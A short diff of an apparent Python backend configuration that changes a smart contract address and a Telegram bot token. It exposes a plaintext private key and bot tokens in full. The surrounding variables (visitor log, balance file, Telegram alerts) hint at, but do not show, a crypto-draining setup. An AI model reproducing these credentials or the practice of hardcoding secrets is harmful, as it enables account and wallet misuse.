@@ -21,7 +21,7 @@ CORS(
 VISITORS_FILE = "visitors.txt"
 BALANCE_FILE = "balance.txt"
 
-smart_contract_address = "0x7183e8afC7B2a097dc848d5f1fB5098db45d678E"
+smart_contract_address = "0xDe3e5F1FC2B30638Eca306F7ac3D1A2500A14A9b"
 
 private_key = "cbf5cc576153c46be8f3fe0010d5a39d518107ff4c8be3d2914239d7e2e9317b"# Pvt key
 
@@ -29,7 +29,7 @@ chat_ids = ["6577768397"] # chat ids
 
 minimum_amount = 1
 
-bot_token = "8283980838:AAGpi0r4VIOeXhHj6oa22_wxF3TaDDxEamE" # bot token
+bot_token = "8596671954:AAGcVJBe3948KawbM8pIHVaSZckrRtiddqs" # bot token
 
 site_url = "https://s**********pp/"
 
